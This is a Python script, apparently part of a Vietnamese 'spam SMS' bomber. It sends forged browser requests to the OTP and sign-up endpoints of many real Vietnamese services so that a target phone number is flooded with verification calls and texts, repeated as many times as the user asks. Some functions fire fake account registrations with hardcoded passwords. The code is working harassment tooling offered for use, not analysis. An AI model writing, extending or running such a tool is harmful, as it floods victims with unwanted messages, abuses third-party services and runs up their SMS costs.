def itaphoa(sdt):
  headers = {
    'Host': 'api.itaphoa.com',
    'region-code': 'HCM',
    'accept': 'application/json',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'origin': 'https://shop.mioapp.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'cross-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://shop.mioapp.vn/',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
}
  params = {
    'phone': f'{sdt}',
    'type': 'call',
}
  response = requests.get('https://api.itaphoa.com/customer/send-gen-otp', params=params, headers=headers).text
  print("|SPAM|THÀNH CÔNG|itaphoa|")
def ghn(sdt):
  headers = {
    'Host': 'online-gateway.ghn.vn',
    # 'content-length': '40',
    'accept': 'application/json, text/plain, */*',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/json',
    'origin': 'https://sso.ghn.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://sso.ghn.vn/',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    
  }
  data = '{"phone":"sdt","type":"register"}'.replace("sdt",sdt)
  response = requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', headers=headers, data=data).json()
  print("|SPAM|THÀNH CÔNG|ghn|")
def best_inc(sdt):
  headers = {
    'Host': 'v9-cc.800best.com',
    'Connection': 'keep-alive',
    # 'Content-Length': '53',
    'x-timezone-offset': '7',
    'x-auth-type': 'web-app',
    'x-nat': 'vi-VN',
    'x-lan': 'VI',
    'authorization': 'null',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/json',
    'accept': 'application/json',
    'lang-type': 'vi-VN',
    'Origin': 'https://best-inc.vn',
    'X-Requested-With': 'mark.via.gp',
    'Sec-Fetch-Site': 'cross-site',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://best-inc.vn/',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
  }
  data = '{"phoneNumber":"sdt","verificationCodeType":1}'.replace("sdt",sdt)
  response = requests.post('https://v9-cc.800best.com/uc/account/sendsignupcode',data=data,headers=headers).text
  print("|SPAM|THÀNH CÔNG|best_inc|")
def sapo(sdt):
  headers = {
    'Host': 'www.sapo.vn',
    # 'content-length': '22',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'accept': '*/*',
    'origin': 'https://www.sapo.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://www.sapo.vn/blog/mat-hang-kinh-doanh-hot-nhat-hien-nay',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'cookie': '_gcl_au=1.1.1060296146.1691285262; _gid=GA1.2.497444655.1691285263; _ga_YNVPPJ8MZP=GS1.1.1691285263.1.0.1691285263.60.0.0; _ga=GA1.1.1816034013.1691285263; _ga_8956TVT2M3=GS1.1.1691285264.1.0.1691285264.60.0.0; _ga_CDD1S5P7D4=GS1.1.1691285264.1.0.1691285264.60.0.0; _ga_GECRBQV6JK=GS1.1.1691285264.1.0.1691285264.60.0.0; _ga_Y9YZPDEGP0=GS1.1.1691285265.1.0.1691285265.60.0.0; start_time=08/06/2023 8:27:45; source=https://www.sapo.vn/blog/mat-hang-kinh-doanh-hot-nhat-hien-nay; _ga_X10JR147Y7=GS1.1.1691285264.1.0.1691285265.59.0.0; _fbp=fb.1.1691285267174.309606627; _ga_EBZKH8C7MK=GS1.2.1691285267.1.0.1691285267.0.0.0; referral=https://www.google.com/; landing_page=https://www.sapo.vn/blog/mat-hang-kinh-doanh-hot-nhat-hien-nay; pageview=1; _ga_8Z6MB85ZM2=GS1.1.1691285265.1.1.1691285333.60.0.0',
    }
  data = {
    'phonenumber': f'{sdt}',
  }
  response = requests.post('https://www.sapo.vn/fnb/sendotp', headers=headers, data=data).json()
  print("|SPAM|THÀNH CÔNG|sapo|")
def findo(sdt):
  headers = {
    'Host': 'api.findo.vn',
    # 'content-length': '39',
    'accept': 'application/json, text/plain, */*',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/json;charset=UTF-8',
    'origin': 'https://www.findo.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://www.findo.vn/',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
}
  data = '{"mobilePhone":{"number":"sdt"}}'.replace('sdt',sdt)
  response = requests.post('https://api.findo.vn/web/public/client/phone/sms-code-ts', headers=headers, data=data).text
  print("|SPAM|THÀNH CÔNG|findo|")
def beecow(sdt):
  headers = {
    'Host': 'api.beecow.com',
    # 'content-length': '138',
    'content-type': 'application/json; text/plain',
    'accept': 'application/json, text/plain, application/stream+json',
    'ati': '1467350218617',
    'platform': 'WEB',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'time-zone': 'Asia/Saigon',
    'origin': 'https://admin.gosell.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'cross-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://admin.gosell.vn/',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
}
  data = '{"password":"12345ccok@","displayName":"","locationCode":"VN-SG","langKey":"vi","mobile":{"countryCode":"+84","phoneNumber":"sdt"}}'.replace('sdt',sdt)
  response = requests.post('https://api.beecow.com/api/register/gosell', headers=headers, data=data).text
  print("|SPAM|THÀNH CÔNG|beecow|")
def cashberry(sdt):
  letters = ["a", "b","c", "d","e", "f","g", "h","i", "j","k", "l","m", "n",
           "o", "p","q", "r","s", "t","u", "v","w", "x","y", "z",]
  random1 = random.choice(letters) + random.choice(letters) + random.choice(letters) + random.choice(letters) + random.choice(letters) + random.choice(letters) + random.choice(letters)
  for x in random1:
    a = x+"@gmail.com" 
  headers = {
    'Host': 'cashberry.vn',
    # 'content-length': '1170',
    'accept': 'application/json, text/plain, */*',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/json',
    'origin': 'https://cashberry.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://cashberry.vn/dang-ky',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'cookie': 'cashberry_new_nuxt_front=vn; site_id=1f21f685be4e9ac1d9dde54d64a5ee30; fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef=wLU0zLsWJMCSuaFRsEAMR9lS8ymsmsZlauYDdKY58gA=; _ga=GA1.1.453475758.1691890639; _fbp=fb.1.1691890639098.1672690554; _lr_hb_-bdwvky%2Fcashberry-vn={%22heartbeat%22:1691890639757}; _lr_uf_-bdwvky=6e4dc5a7-23fc-4687-9efe-b0d1ea7ebdf2; _lr_tabs_-bdwvky%2Fcashberry-vn={%22sessionID%22:0%2C%22recordingID%22:%225-5d2ee190-bf44-4420-bbcf-69d94bc1229c%22%2C%22webViewID%22:null%2C%22lastActivity%22:1691890645656}; _ga_53M1222GXQ=GS1.1.1691890638.1.1.1691890649.0.0.0',
}
  data = '{"phone":"sdt","inn":"583805682558","email":"email11","password":"12345Gdtg@","password_repeat":"12345Gdtg@","agree":true,"is_confirmed_kyivstar":1,"email_mailing":1,"registrationActionsReport":{"Object_1":{"Keypress":null,"Activate":1,"TimeLast":3,"TimeAll":60,"SymbolFact":10,"Copy":null,"Paste":null,"Click":1,"Tab":null,"BackspaceLast":null,"BackspaceAll":null,"DelLast":null,"DelAll":null,"Changes":1,"Error":17},"Object_2":{"Keypress":null,"Activate":null,"TimeLast":null,"TimeAll":null,"SymbolFact":19,"Copy":null,"Paste":null,"Click":null,"Tab":null,"BackspaceLast":null,"BackspaceAll":null,"DelLast":null,"DelAll":null,"Changes":null,"Error":4},"Object_3":{"Activate":1,"TimeLast":6,"TimeAll":6,"SymbolFact":10,"Paste":null,"Click":1,"Tab":null,"BackspaceLast":null,"BackspaceAll":null,"DelLast":null,"DelAll":null,"Changes":1,"Error":null},"Object_15":{"Keypress":null,"Activate":null,"TimeLast":null,"TimeAll":null,"SymbolFact":null,"Copy":null,"Paste":null,"Click":null,"Tab":null,"BackspaceLast":null,"BackspaceAll":null,"DelLast":null,"DelAll":null,"Changes":null,"Error":null},"Object_41":{"Activate":null,"Changes":null,"Error":null}}}'.replace('email11',a)
  data = data.replace('sdt',sdt)
  response = requests.post('https://cashberry.vn/proxy/user/register', headers=headers, data=data).text
  print("|SPAM|THÀNH CÔNG|cashberry")

def kimungvay(sdt):
  headers = {
    'Host': 'api.kimungvay.co',
    # 'content-length': '73',
    'accept': 'application/json, text/plain, */*',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://h5.kimungvay.site',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'cross-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://h5.kimungvay.site/',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
}

  data = {
    'phone': f'{sdt}',
    'type': '2',
    'ctype': '1',
    'chntoken': 'e51d233aa164cb9ec126578fc2d553f6',
}
  response = requests.post('https://api.kimungvay.co/h5/LoginMessage_ultimate', headers=headers, data=data).text
  print("|SPAM|THÀNH CÔNG|kimungvay")


def run(sdt, i):
    with ThreadPoolExecutor(max_workers=1) as executor:
        executor.submit(regthantaioi,sdt)
        time.sleep(1)
        executor.submit(sapo,sdt)
        time.sleep(1)
        executor.submit(onecredit,sdt)
        time.sleep(1)
        executor.submit(y360,sdt)
        time.sleep(1)
        executor.submit(tv360,sdt)
        time.sleep(1)
        executor.submit(winmart,sdt)
        time.sleep(1)
        executor.submit(apispam,sdt)
        time.sleep(1)
        executor.submit(vieon,sdt)
        time.sleep(1)
        executor.submit(poyeye,sdt)
        time.sleep(1)
        executor.submit(alfrescos,sdt)
        time.sleep(1)
        executor.submit(fpt,sdt)
        time.sleep(1)
        executor.submit(kiot,sdt)
        time.sleep(1)
        executor.submit(vayvnd,sdt)
        time.sleep(1)
        executor.submit(viettel,sdt)
        time.sleep(1)
        executor.submit(tamo,sdt)
        time.sleep(1)
        executor.submit(meta,sdt)
        time.sleep(1)
        executor.submit(funring,sdt)
        time.sleep(1)
        executor.submit(dkvt,sdt)
        time.sleep(1)
        executor.submit(fptplay,sdt)
        time.sleep(1)
        executor.submit(vietid,sdt)
        time.sleep(1)
        executor.submit(phamacy,sdt)
        time.sleep(1)
        executor.submit(y360rs,sdt)
        time.sleep(1)
        executor.submit(concung,sdt)
        time.sleep(1)
        executor.submit(appota,sdt)
        time.sleep(1)
        executor.submit(pizzacompany,sdt)
        time.sleep(1)
        executor.submit(best_inc,sdt)
        time.sleep(1)
        executor.submit(shopiness,sdt)
        time.sleep(1)
        executor.submit(ghn,sdt)
        time.sleep(1)
        executor.submit(chotot,sdt)
        time.sleep(1)
        executor.submit(cashbar,sdt)
        time.sleep(1)
        executor.submit(ubofood,sdt)
        time.sleep(1)
        executor.submit(bibabo,sdt)
        time.sleep(1)
        executor.submit(itaphoa,sdt)
        time.sleep(1)
        executor.submit(findo,sdt)
        time.sleep(1)
        executor.submit(beecow,sdt)
        time.sleep(1)
        executor.submit(cashberry,sdt)
        time.sleep(1)
        executor.submit(takomo,sdt)
        time.sleep(1)
        executor.submit(kimungvay,sdt)
        time.sleep(1)
        executor.submit(thantaioi)
        time.sleep(1)
        print("Spam thành công lần:", i)

def main():
    parser = argparse.ArgumentParser(
        description="Spam SMS",
        epilog="Example: python3 spamsms.py 0123456789 5",
        add_help=True
    )
    parser.add_argument("phone_number", type=str, nargs="?", help="Số điện thoại cần spam")
    parser.add_argument("spam_thread", type=int, nargs="?", help="Số lần spam")
    args = parser.parse_args()

    if args.phone_number is None or args.spam_thread is None:
        parser.print_help()
        return

    banner()
    sdt = args.phone_number
    
    while not validate_phone_number(sdt):
        print("SAI ĐỊNH DẠNG VUI LÒNG NHẬP LẠI")
        sdt = input("\nNhập SĐT Cần Spam: ")
    
    count = args.spam_thread
    
    # danh sách blacklist
    if sdt == "0123456789":
        print("\nMÀY THÍCH SPAM LẮM À =))")
        quit()
    
    for i in range(1, count+1):
        run(sdt, i)

if __name__ == "__main__":
    main()
